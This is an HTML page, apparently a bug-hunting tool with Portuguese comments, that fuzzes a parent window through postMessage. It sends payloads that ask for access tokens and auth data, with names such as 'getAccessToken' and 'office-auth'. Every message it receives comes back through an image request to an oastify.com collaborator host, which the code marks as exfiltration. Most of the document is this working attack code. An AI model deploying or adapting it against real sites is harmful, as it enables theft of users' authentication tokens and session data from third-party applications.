<!DOCTYPE html>
<html>
<head>
  <title>postMessage Fuzzer</title>
  <style>
    body {
      background: black;
      color: #0f0;
      font-family: monospace;
      padding: 1rem;
    }
  </style>
</head>
<body>
  <h2>ðŸ”¥ postMessage Fuzzer iniciado</h2>
  <pre id="log"></pre>

  <script>
    const log = (msg) => {
      const pre = document.getElementById("log");
      pre.textContent += msg + "\n";
      console.log(msg);
    };

    // Lista de payloads para fuzzing
    const payloads = [
      "ping",
      { type: "ping" },
      { action: "ping" },
      { command: "ping" },
      { type: "getContext" },
      { action: "getAccessToken" },
      { action: "getUser" },
      { type: "getAuth" },
      { target: "office-auth", action: "getToken" },
      { target: "microsoft", data: { request: "auth" }},
      { messageType: "getToken" },
      { requestId: 123, method: "getAccessToken" },
      { meta: { cmd: "auth" } },
      { ms: true, command: "init" },
      { a: 1, b: 2 },
      { random: Math.random().toString(36).substring(2) }
    ];

    // Envia todos os payloads
    function sendPayloads() {
      log("ðŸš€ Enviando payloads para parent...");
      payloads.forEach((data, i) => {
        setTimeout(() => {
          parent.postMessage(data, "*");
          log("ðŸ“¤ Enviado: " + JSON.stringify(data));
        }, i * 500);
      });
    }

    // Escuta respostas
    window.addEventListener("message", (e) => {
      const data = {
        origin: e.origin,
        data: e.data
      };
      log("ðŸ“¥ Recebido: " + JSON.stringify(data, null, 2));

      // Exfiltra (opcional):
      const img = new Image();
      img.src = `https://k2nxq1ustsd6o6gb79wwabzjcai16rug.oastify.com/?data=${encodeURIComponent(JSON.stringify(data))}`;
    });

    // Inicia fuzzing
    sendPayloads();
  </script>
</body>
</html>
